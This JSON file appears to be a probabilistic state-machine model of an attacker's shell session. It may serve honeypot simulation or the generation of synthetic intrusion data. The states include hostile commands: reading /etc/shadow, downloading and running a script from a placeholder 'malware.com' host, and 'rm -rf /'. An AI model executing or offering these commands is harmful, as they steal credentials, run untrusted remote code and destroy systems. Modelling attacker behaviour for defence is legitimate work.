{
  "start": "bash",
  "states": {
    "bash": {
      "type": "macro",
      "transitions": {
        "ls": 0.4,
        "cat": 0.3,
        "wget": 0.3
      }
    },
    "ls": {
      "type": "micro",
      "transitions": {
        "ls -la": 0.6,
        "ls /tmp": 0.4
      }
    },
    "ls -la": {
      "type": "macro",
      "transitions": {
        "cat": 0.5,
        "exit": 0.5
      }
    },
    "ls /tmp": {
      "type": "macro",
      "transitions": {
        "cat": 0.7,
        "rm": 0.3
      }
    },
    "cat": {
      "type": "micro",
      "transitions": {
        "cat /etc/passwd": 0.5,
        "cat /etc/shadow": 0.5
      }
    },
    "cat /etc/passwd": {
      "type": "macro",
      "transitions": {
        "grep": 0.7,
        "exit": 0.3
      }
    },
    "cat /etc/shadow": {
      "type": "macro",
      "transitions": {
        "wget": 0.6,
        "exit": 0.4
      }
    },
    "wget": {
      "type": "micro",
      "transitions": {
        "wget http://malware.com/a.sh": 1.0
      }
    },
    "wget http://malware.com/a.sh": {
      "type": "macro",
      "transitions": {
        "chmod": 1.0
      }
    },
    "chmod": {
      "type": "micro",
      "transitions": {
        "chmod +x a.sh": 1.0
      }
    },
    "chmod +x a.sh": {
      "type": "macro",
      "transitions": {
        "./a.sh": 1.0
      }
    },
    "./a.sh": {
      "type": "macro",
      "transitions": {
        "exit": 1.0
      }
    },
    "rm": {
      "type": "micro",
      "transitions": {
        "rm -rf /": 1.0
      }
    },
    "rm -rf /": {
      "type": "macro",
      "transitions": {
        "exit": 1.0
      }
    },
    "grep": {
      "type": "micro",
      "transitions": {
        "grep root /etc/passwd": 1.0
      }
    },
    "grep root /etc/passwd": {
      "type": "macro",
      "transitions": {
        "exit": 1.0
      }
    },
    "exit": {
      "type": "terminal",
      "transitions": {}
    }
  }
}

